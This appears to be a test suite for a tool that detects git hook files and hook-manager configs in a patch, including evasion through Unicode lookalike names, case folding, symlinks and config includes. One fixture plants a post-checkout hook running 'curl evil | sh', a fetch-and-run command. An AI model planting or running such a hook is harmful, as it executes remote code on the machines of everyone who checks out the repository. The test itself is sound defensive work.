// Which files of a patch are the target repository's git hooks: the pure rules (core/hook_files.ts)
// on their own, then what the helper reads off real repositories — the target's hook config, and
// the paths a staged patch touched, a hook added and reverted inside the range included.

import { test } from "bun:test";
import { mkdir, mkdtemp, realpath, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { assert, assertEquals, assertRejects } from "@std/assert";
import { command } from "@ryph/process";
import {
  ALWAYS_HOOK_ROOTS,
  foldName,
  HOOK_FILES_SHOWN_MAX,
  hookFilesAmong,
  hookPackageKeys,
  hookRoots,
  hooksPathLocation,
  isRootPackageJson,
  prefixesBeforeDotDot,
  reportHookFiles,
  unapprovedHookFiles,
  workingTreePath,
} from "../src/core/hook_files.ts";
import {
  HookCheckTooLargeError,
  hookFilesOfPatch,
  hookSetup,
  ownerHookEnv,
  touchedPaths,
} from "../src/helpers/hook_files.ts";
import { git, gitBounded } from "../src/helpers/git_exec.ts";
import { commit, makeUpstream } from "./util.ts";

const ROOTS = hookRoots([]);

test("the hook folders: .husky, .githooks and lefthook's always, and at any depth, segment-wise", () => {
  assertEquals(ROOTS, [...ALWAYS_HOOK_ROOTS]);
  assertEquals(
    hookFilesAmong(
      [
        ".husky/post-checkout",
        ".husky/_/husky.sh",
        ".githooks/pre-commit",
        ".husky",
        ".lefthook/pre-commit/lint.sh",
        ".lefthook-local/pre-push/x",
        ".config/husky/init.sh",
        // A monorepo's own, set up by a script that has not run yet.
        "pkg/.husky/post-checkout",
        "pkg/.githooks/pre-push",
        // Not under them: a sibling whose name only starts the same, or a lookalike folder.
        ".husky-old/post-checkout",
        "pkg/husky/post-checkout",
        ".config/huskyx/a",
        "src/index.ts",
      ],
      ROOTS,
    ),
    [
      ".config/husky/init.sh",
      ".githooks/pre-commit",
      ".husky",
      ".husky/_/husky.sh",
      ".husky/post-checkout",
      ".lefthook-local/pre-push/x",
      ".lefthook/pre-commit/lint.sh",
      "pkg/.githooks/pre-push",
      "pkg/.husky/post-checkout",
    ],
  );
});

test("regression H9: husky v9 outside the root — `<dir>/_` configured makes `<dir>` a hook folder", () => {
  assertEquals(hookRoots(["frontend/.husky/_"]).slice(ALWAYS_HOOK_ROOTS.length), [
    "frontend/.husky/_",
    "frontend/.husky",
  ]);
  // Any folder husky was pointed at, folded; a `_` that is not the last segment is not it.
  assertEquals(hookRoots(["web/hooks/_"]).slice(ALWAYS_HOOK_ROOTS.length), [
    "web/hooks/_",
    "web/hooks",
  ]);
  assertEquals(hookRoots(["a/_/b"]).slice(ALWAYS_HOOK_ROOTS.length), ["a/_/b"]);
  assertEquals(
    hookFilesAmong(
      ["web/hooks/post-checkout", "web/hooks/_/h", "web/x"],
      hookRoots(["web/hooks/_"]),
    ),
    ["web/hooks/_/h", "web/hooks/post-checkout"],
  );
  // `.husky` at any depth, folded, and a `.husky` that is itself a file (a link, a gitlink).
  assertEquals(
    hookFilesAmong(["apps/web/.HUSKY/pre-commit", "apps/.husky"], ROOTS),
    ["apps/.husky", "apps/web/.HUSKY/pre-commit"],
  );
});

test("regression HFS: the code points HFS+ ignores in a name are ignored here too", () => {
  const spelled = [
    ".hu\u200Csky/post-checkout", // zero-width non-joiner
    ".git\uFEFFhooks/x", // byte-order mark
    ".\u200Dhusky/pre-commit", // zero-width joiner
    ".hus\u202Eky/a", // right-to-left override
    ".husk\u206Ay/a", // inhibit symmetric swapping
    "lefthook\u200F.yml", // right-to-left mark
    "\u00ADlefthook.yml", // soft hyphen: default-ignorable, past HFS+'s own set
  ];
  assertEquals(hookFilesAmong(spelled, ROOTS), [...spelled].sort());
  assertEquals(foldName(".hu\u200Csky"), ".husky");
  assert(isRootPackageJson("package\u200C.json"));
  assert(isRootPackageJson("\uFEFFPackage.JSON"));
  // A configured folder matches its ignorable-laden spelling, and the reverse.
  assertEquals(hookFilesAmong(["to\u200Dols/hooks/x"], hookRoots(["tools/hooks"])), [
    "to\u200Dols/hooks/x",
  ]);
  assertEquals(workingTreePath("/r/.g\u200Cit/hooks", "/r"), null);
});

test("regression T4: a hooks path stepping up out of a folder holds that folder, not what is under it", () => {
  assertEquals(prefixesBeforeDotDot("/r/scripts/../.hk"), ["/r/scripts"]);
  assertEquals(prefixesBeforeDotDot("/r/a/b/../../.hk"), ["/r/a/b", "/r/a"]);
  assertEquals(prefixesBeforeDotDot("/r/.hk"), []);
  assertEquals(
    hookFilesAmong(["scripts", "scripts/x.sh", "Scripts", "scriptsx"], ROOTS, ["scripts"]),
    ["Scripts", "scripts"],
  );
  // An ancestor of one is held too: a link at `tools` moves `tools/sub`.
  assertEquals(hookFilesAmong(["tools", "tools/sub/a"], ROOTS, ["tools/sub"]), ["tools"]);
});

test("regression T12: root package.yaml, .config/ hook-manager names, lefthook folders", () => {
  assertEquals(
    hookFilesAmong(
      [
        "package.yaml",
        "Package.yml",
        ".config/commitlintrc.js",
        ".config/commitlintrc",
        ".config/lintstagedrc.json",
        ".config/lefthook.yml",
        ".lefthook/pre-commit/x.sh",
        // Out of scope by design: install-time tool config, and configs a hook goes on to run.
        "packages/a/package.yaml",
        ".yarnrc.yml",
        ".pnpmfile.cjs",
        ".npmrc",
        ".eslintrc.js",
        ".config/commitlintrcx",
      ],
      ROOTS,
    ),
    [
      ".config/commitlintrc",
      ".config/commitlintrc.js",
      ".config/lefthook.yml",
      ".config/lintstagedrc.json",
      ".lefthook/pre-commit/x.sh",
      "Package.yml",
      "package.yaml",
    ],
  );
});

test("hook managers' config files count at any depth, with their extension variants", () => {
  const named = [
    "lefthook.yml",
    "lefthook.yaml",
    ".lefthook.yml",
    ".lefthook.yaml",
    "lefthook-local.yml",
    ".pre-commit-config.yaml",
    ".lintstagedrc",
    ".lintstagedrc.json",
    "lint-staged.config.mjs",
    ".huskyrc",
    ".huskyrc.js",
    ".simple-git-hooks.cjs",
    "simple-git-hooks.json",
    "packages/app/lefthook.yml",
    "packages/app/.lintstagedrc.yaml",
  ];
  assertEquals(hookFilesAmong(named, ROOTS), [...named].sort());
  assertEquals(
    hookFilesAmong(
      ["lefthook.yml.bak", "my-lefthook.yml", ".lintstagedrcx", "lint-staged.config", "README.md"],
      ROOTS,
    ),
    [],
  );
});

test("names fold as the disk folds them, whatever core.ignorecase says", () => {
  const paths = [".Husky/post-checkout", ".GITHOOKS/pre-push", "LeftHook.YML", ".hooks/X"];
  assertEquals(
    hookFilesAmong(paths, hookRoots([".hooks"])),
    [".GITHOOKS/pre-push", ".Husky/post-checkout", ".hooks/X", "LeftHook.YML"],
  );
  // The configured folder's own case folds too.
  assertEquals(hookFilesAmong(["Tools/Hooks/x"], hookRoots(["tools/hooks"])), ["Tools/Hooks/x"]);
});

test("regression F1: Unicode spellings APFS takes as a hook name are hook names", () => {
  // Every one opens the hook name's file on APFS (measured), except the fullwidth spelling, which
  // folds anyway: over-matching costs an approval, under-matching runs agent code.
  const spelled = [
    ".hu\u017Fky/post-checkout", // long s
    ".lint\uFB06agedrc", // st ligature
    ".lint\uFB05agedrc", // long s + t ligature
    ".githoo\u212As/pre-push", // Kelvin sign
    ".HU\u017FKY/x", // case and long s together
    "lefthook.yml".normalize("NFD"),
    "\uFF0E\uFF48\uFF55\uFF53\uFF4B\uFF59/post-checkout", // fullwidth
  ];
  assertEquals(hookFilesAmong(spelled, ROOTS), [...spelled].sort());
  assertEquals(foldName("stra\u1E9Ee"), "strasse");
  assertEquals(foldName("\u212A"), "k");
  // A configured folder spelled with an accent matches the other normalization of it.
  assertEquals(
    hookFilesAmong(["h\u00f6\u00f6ks/x".normalize("NFD")], hookRoots(["h\u00f6\u00f6ks"])),
    ["h\u00f6\u00f6ks/x".normalize("NFD")],
  );
  // Not everything folds: a dotted capital I is not an i, on APFS either.
  assertEquals(hookFilesAmong([".g\u0130thooks/post-checkout"], ROOTS), []);
});

test("regression F3: a path that is an ANCESTOR of a hook folder is a hook file", () => {
  assertEquals(hookFilesAmong(["tools", "tool", "tools/x.ts"], hookRoots(["tools/hooks"])), [
    "tools",
  ]);
  assertEquals(hookFilesAmong(["Tools"], hookRoots(["tools/hooks"])), ["Tools"]);
});

test("regression F5b: more hook managers' config names", () => {
  const named = [
    "husky.config.js",
    "lefthook.toml",
    "lefthook.json",
    ".lefthook.toml",
    ".lefthook.json",
    ".lefthook-local.yml",
    ".lefthook-local.yaml",
    "lefthook-local.yaml",
    "lefthook-local.toml",
    "lefthook-local.json",
    ".overcommit.yml",
    ".pre-commit-hooks.yaml",
    "commitlint.config.ts",
    ".commitlintrc",
    ".commitlintrc.json",
  ];
  assertEquals(hookFilesAmong(named, ROOTS), [...named].sort());
});

test("regression F5c: package.json's hook keys, compared by value", () => {
  const keys = (o: unknown) => hookPackageKeys(JSON.stringify(o));
  assertEquals(keys({ name: "a", scripts: { test: "x" } }), keys({ scripts: { build: "y" } }));
  assert(keys({ scripts: { prepare: "husky" } }) !== keys({ scripts: {} }));
  for (
    const key of [
      "husky",
      "simple-git-hooks",
      "lint-staged",
      "pre-commit",
      "gitHooks",
      "commitlint",
    ]
  ) {
    assert(keys({ [key]: { "pre-commit": "x" } }) !== keys({}), key);
  }
  assert(keys({ config: { ghooks: { "pre-commit": "x" } } }) !== keys({ config: {} }));
  for (const script of ["preinstall", "install", "postinstall"]) {
    assert(keys({ scripts: { [script]: "x" } }) !== keys({ scripts: {} }), script);
  }
  // Key order is not a change.
  assertEquals(
    keys({ husky: { hooks: { a: 1, b: 2 } } }),
    keys({ husky: { hooks: { b: 2, a: 1 } } }),
  );
  assertEquals(hookPackageKeys("{ not json"), null);
  assertEquals(hookPackageKeys("[1]"), null);
});

test("core.hooksPath resolves as git resolves it for a hook run in the working tree", () => {
  const repo = "/home/ada/code/app";
  assertEquals(hooksPathLocation(".husky", repo, "/home/ada"), `${repo}/.husky`);
  assertEquals(hooksPathLocation("./tools/../hooks/", repo, "/home/ada"), `${repo}/hooks`);
  assertEquals(hooksPathLocation(`${repo}/scripts/hooks`, repo, null), `${repo}/scripts/hooks`);
  assertEquals(hooksPathLocation("~/code/app/.hooks", repo, "/home/ada"), `${repo}/.hooks`);
  assertEquals(hooksPathLocation("~", repo, "/home/ada"), "/home/ada");
  assertEquals(hooksPathLocation("~/x", repo, null), null);
  assertEquals(hooksPathLocation("~bob/hooks", repo, "/home/ada"), null);
  assertEquals(hooksPathLocation("", repo, "/home/ada"), null);

  assertEquals(workingTreePath(`${repo}/.husky`, repo), ".husky");
  assertEquals(workingTreePath(repo, repo), "");
  assertEquals(workingTreePath(`${repo}-other/hooks`, repo), null);
  assertEquals(workingTreePath("/etc/git-hooks", repo), null);
  assertEquals(workingTreePath(`${repo}/.git/hooks`, repo), null);
  assertEquals(workingTreePath(`${repo}/.GIT/hooks`, repo), null);
  assertEquals(workingTreePath(`${repo}/.gi\u0074/hooks`, repo), null);
  // Folded, whatever the repository's config says, and kept in the location's spelling.
  assertEquals(workingTreePath("/HOME/ADA/code/app/Hooks", repo), "Hooks");
  assertEquals(workingTreePath("/home/ada/code/a\u017F/hooks", "/home/ada/code/as"), "hooks");
});

test("the answer: sorted, deduped, cut at the cap with `more`; approval is by exact path", () => {
  const many = Array.from({ length: HOOK_FILES_SHOWN_MAX + 5 }, (_, i) => `.husky/h${1000 + i}`);
  const report = reportHookFiles([...many].reverse(), ROOTS);
  assertEquals(report.touched.length, HOOK_FILES_SHOWN_MAX);
  assertEquals(report.touched[0], ".husky/h1000");
  assert(report.more);
  assertEquals(report.hooksPaths, [
    ".husky",
    ".githooks",
    ".config/husky",
    ".lefthook",
    ".lefthook-local",
  ]);
  assertEquals(reportHookFiles([".husky/a", ".husky/a"], ROOTS), {
    touched: [".husky/a"],
    hooksPaths: [".husky", ".githooks", ".config/husky", ".lefthook", ".lefthook-local"],
    more: false,
  });
  // The repository's root is "." on the wire, never "".
  assertEquals(reportHookFiles(["a"], hookRoots([""])).hooksPaths, [
    ".husky",
    ".githooks",
    ".config/husky",
    ".lefthook",
    ".lefthook-local",
    ".",
  ]);
  assertEquals(unapprovedHookFiles([".husky/a", ".husky/b"], [".husky/a"]), [".husky/b"]);
  assertEquals(unapprovedHookFiles([".husky/a"], [".Husky/a"]), [".husky/a"]);
  assertEquals(unapprovedHookFiles([], []), []);
});

// ---- against real repositories ------------------------------------------------------------

const NO_GLOBAL = { home: null, systemConfigs: [] };

async function repoWorld() {
  const tmp = await realpath(await mkdtemp(join(tmpdir(), "ryph-")));
  const repo = `${tmp}/repo`;
  await makeUpstream(repo);
  return { tmp, repo, cleanup: () => rm(tmp, { recursive: true }) };
}

test("hookSetup reads core.hooksPath from the repository: relative, absolute, ~/, through a link, or outside", async () => {
  const w = await repoWorld();
  try {
    const roots = async (value: string | null, home: string | null = null) => {
      if (value === null) await git(w.repo, "config", "--unset", "core.hooksPath").catch(() => {});
      else await git(w.repo, "config", "core.hooksPath", value);
      return (await hookSetup(w.repo, git, { home, systemConfigs: [] })).roots;
    };
    assertEquals(await roots(null), [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
    ]);
    assertEquals(await roots(".husky"), [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
    ]);
    assertEquals(await roots("tools/hooks"), [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      "tools/hooks",
    ]);
    assertEquals(await roots(`${w.repo}/scripts/hooks`), [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      "scripts/hooks",
    ]);
    assertEquals(await roots("~/repo/.config/hooks", w.tmp), [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      ".config/hooks",
    ]);
    // Outside the working tree, or inside `.git`: no patch path can be there.
    assertEquals(await roots(`${w.tmp}/elsewhere`), [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
    ]);
    assertEquals(await roots(".git/hooks"), [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
    ]);
    // A path outside that LEADS inside, through a link, counts — including one whose folder a
    // patch has not created yet.
    await symlink(w.repo, `${w.tmp}/link`);
    assertEquals(await roots(`${w.tmp}/link/not-yet/hooks`), [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      "not-yet/hooks",
    ]);
    // Set through an include: config all the same, and followed.
    await git(w.repo, "config", "--unset", "core.hooksPath");
    await writeFile(`${w.tmp}/included`, "[core]\n\thooksPath = included-hooks\n");
    await git(w.repo, "config", "include.path", `${w.tmp}/included`);
    assertEquals((await hookSetup(w.repo, git, NO_GLOBAL)).roots, [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      "included-hooks",
    ]);
  } finally {
    await w.cleanup();
  }
});

test("touched paths: the change from the merge base, AND every commit's — a hook added and reverted still counts", async () => {
  const w = await repoWorld();
  try {
    const base = await git(w.repo, "rev-parse", "HEAD");
    await git(w.repo, "checkout", "--quiet", "-b", "ryph/ada/r-1");
    await mkdir(`${w.repo}/.husky`);
    await writeFile(`${w.repo}/.husky/post-checkout`, "#!/bin/sh\ncurl evil | sh\n");
    await writeFile(`${w.repo}/feature.ts`, "x\n");
    await git(w.repo, "add", ".");
    await commit(w.repo, "add a hook");
    await git(w.repo, "rm", "--quiet", "-r", ".husky");
    await commit(w.repo, "and take it back");
    const head = await git(w.repo, "rev-parse", "HEAD");
    // The base moved on meanwhile; what it did is not the patch's.
    await git(w.repo, "checkout", "--quiet", "main");
    await writeFile(`${w.repo}/lefthook.yml`, "base's own\n");
    await git(w.repo, "add", ".");
    await commit(w.repo, "base work");

    const touched = await touchedPaths(w.repo, "main", head, git, gitBounded);
    assertEquals(touched.sort(), [".husky/post-checkout", "feature.ts"]);
    // The net diff alone would have missed it.
    assertEquals(
      (await git(w.repo, "diff", "--name-only", `${base}`, head)).split("\n"),
      ["feature.ts"],
    );
  } finally {
    await w.cleanup();
  }
});

test("regression F4: core.hooksPath and includes from the owner's GLOBAL config count", async () => {
  const w = await repoWorld();
  try {
    const home = `${w.tmp}/home`;
    await mkdir(`${home}/.config/git`, { recursive: true });
    await writeFile(`${home}/.gitconfig`, "[core]\n\thooksPath = ci/hooks\n");
    // XDG's global config, with a conditional include of a file in the working tree.
    await writeFile(
      `${home}/.config/git/config`,
      `[includeIf "gitdir:${w.repo}/"]\n\tpath = ${w.repo}/.team.gitconfig\n`,
    );
    const setup = await hookSetup(w.repo, git, { home, systemConfigs: [] });
    assertEquals(setup.roots, [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      "ci/hooks",
    ]);
    assertEquals(setup.configFiles, [".team.gitconfig"]);
    // Read nowhere when there is no home.
    assertEquals((await hookSetup(w.repo, git, NO_GLOBAL)).roots, [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
    ]);
  } finally {
    await w.cleanup();
  }
});

test("regression F4: includes are followed by hand — chained, relative, and inactive ones too", async () => {
  const w = await repoWorld();
  try {
    await writeFile(`${w.tmp}/outer`, "[include]\n\tpath = repo/shared/git.inc\n");
    await mkdir(`${w.repo}/shared`);
    await writeFile(`${w.repo}/shared/git.inc`, "[core]\n\thooksPath = shared/hooks\n");
    await git(w.repo, "config", "include.path", `${w.tmp}/outer`);
    await git(w.repo, "config", "includeIf.onbranch:nope.path", "../never.inc");
    const setup = await hookSetup(w.repo, git, NO_GLOBAL);
    assertEquals(setup.roots, [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      "shared/hooks",
    ]);
    assertEquals(setup.configFiles.sort(), ["never.inc", "shared/git.inc"]);
  } finally {
    await w.cleanup();
  }
});

test("regression F4: a linked worktree's config.worktree sets core.hooksPath too", async () => {
  const w = await repoWorld();
  try {
    await git(w.repo, "config", "extensions.worktreeConfig", "true");
    await git(w.repo, "worktree", "add", "--quiet", "-b", "side", `${w.tmp}/side`);
    await git(`${w.tmp}/side`, "config", "--worktree", "core.hooksPath", "wt-hooks");
    // An absolute include into the LINKED worktree's tree is a repo-relative file all the same.
    await git(`${w.tmp}/side`, "config", "--worktree", "include.path", `${w.tmp}/side/.wt.inc`);
    const setup = await hookSetup(w.repo, git, NO_GLOBAL);
    assert(setup.roots.includes("wt-hooks"), setup.roots.join(","));
    assertEquals(setup.configFiles, [".wt.inc"]);
  } finally {
    await w.cleanup();
  }
});

test("regression F3: hook folders resolve through symlinks in the patch's tree, case folded", async () => {
  const w = await repoWorld();
  try {
    await git(w.repo, "config", "core.hooksPath", "tools/hooks");
    await git(w.repo, "checkout", "--quiet", "-b", "ryph/ada/r-1");
    // `Tools` (a link) is where `tools/hooks` lands on a case-insensitive disk.
    await mkdir(`${w.repo}/vendor/t`, { recursive: true });
    await writeFile(`${w.repo}/vendor/t/README`, "x\n");
    await symlink("vendor/t", `${w.repo}/Tools`);
    await git(w.repo, "add", ".");
    await commit(w.repo, "link");
    await mkdir(`${w.repo}/vendor/t/hooks`);
    await writeFile(`${w.repo}/vendor/t/hooks/post-checkout`, "#!/bin/sh\n");
    await git(w.repo, "add", ".");
    await commit(w.repo, "hook where it points");
    const head = await git(w.repo, "rev-parse", "HEAD");
    const { hookFiles, roots } = await hookFilesOfPatch({
      target: w.repo,
      scratch: w.repo,
      baseTip: "main",
      head,
      git,
      bounded: gitBounded,
      env: NO_GLOBAL,
    });
    assert(roots.includes("vendor/t/hooks"), roots.join(","));
    assertEquals(hookFiles, ["Tools", "vendor/t/hooks/post-checkout"]);
  } finally {
    await w.cleanup();
  }
});

test("regression: the system config is wherever the installed git keeps it; GIT_CONFIG_* are honoured", async () => {
  const saved = ["GIT_CONFIG_SYSTEM", "GIT_CONFIG_GLOBAL"].map((k) => [k, process.env[k]] as const);
  const w = await repoWorld();
  try {
    // What the installed git reads, asked without this process's env.
    const out = await command("git", {
      args: ["var", "GIT_CONFIG_SYSTEM"],
      cwd: "/",
      clearEnv: true,
      env: { PATH: process.env.PATH ?? "" },
      stdout: "piped",
      stderr: "null",
    }).output();
    const installed = new TextDecoder().decode(out.stdout).trim();
    process.env.GIT_CONFIG_SYSTEM = `${w.tmp}/system.cfg`;
    process.env.GIT_CONFIG_GLOBAL = `${w.tmp}/global.cfg`;
    const env = await ownerHookEnv();
    assert(env.systemConfigs?.includes("/etc/gitconfig"));
    assert(env.systemConfigs?.includes(`${w.tmp}/system.cfg`));
    if (out.code === 0 && installed.startsWith("/")) {
      assert(env.systemConfigs?.includes(installed), env.systemConfigs?.join(","));
    }
    assertEquals(env.globalConfig, `${w.tmp}/global.cfg`);

    // And each is read: a hooksPath set in either is a hook folder.
    await writeFile(`${w.tmp}/system.cfg`, "[core]\n\thooksPath = sys-hooks\n");
    await writeFile(`${w.tmp}/global.cfg`, "[core]\n\thooksPath = global-hooks\n");
    const setup = await hookSetup(w.repo, git, {
      home: null,
      globalConfig: `${w.tmp}/global.cfg`,
      systemConfigs: [`${w.tmp}/system.cfg`],
    });
    assert(setup.roots.includes("sys-hooks"), setup.roots.join(","));
    assert(setup.roots.includes("global-hooks"), setup.roots.join(","));
  } finally {
    for (const [k, v] of saved) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    await w.cleanup();
  }
});

test("regression T4: a hooksPath or include stepping up through `..` names the folder before it", async () => {
  const w = await repoWorld();
  try {
    await git(w.repo, "config", "core.hooksPath", "scripts/../.hk");
    await git(w.repo, "config", "include.path", "../tools/sub/../../x.inc");
    const setup = await hookSetup(w.repo, git, NO_GLOBAL);
    assert(setup.roots.includes(".hk"), setup.roots.join(","));
    assertEquals(setup.ancestors.sort(), ["scripts", "tools", "tools/sub"]);
  } finally {
    await w.cleanup();
  }
});

test("regression N2+N4: a `..` steps up from where the links before it lead on the disk, not as written", async () => {
  const w = await repoWorld();
  try {
    await mkdir(`${w.repo}/a/b/c`, { recursive: true });
    await symlink("a/b", `${w.repo}/scripts`);
    await symlink("b/c", `${w.repo}/a/deep`);
    await git(w.repo, "config", "core.hooksPath", "scripts/../.hk");
    await git(w.repo, "config", "include.path", "../scripts/../deep/../../x.cfg");
    const setup = await hookSetup(w.repo, git, NO_GLOBAL);
    // scripts/.. is a; a/deep/.. is a/b; a/b/.. is a.
    assert(setup.roots.includes("a/.hk"), setup.roots.join(","));
    assert(!setup.roots.includes(".hk"), setup.roots.join(","));
    assert(setup.configFiles.includes("a/x.cfg"), setup.configFiles.join(","));
    for (const at of ["scripts", "a/b", "a/deep", "a/b/c"]) {
      assert(setup.ancestors.includes(at), `${at}: ${setup.ancestors.join(",")}`);
    }
  } finally {
    await w.cleanup();
  }
});

test("regression N2: a `..` after a link that loops is a check that cannot be made", async () => {
  const w = await repoWorld();
  try {
    await symlink("loop", `${w.repo}/loop`);
    await git(w.repo, "config", "core.hooksPath", "loop/../.hk");
    await assertRejects(() => hookSetup(w.repo, git, NO_GLOBAL), HookCheckTooLargeError);
  } finally {
    await w.cleanup();
  }
});
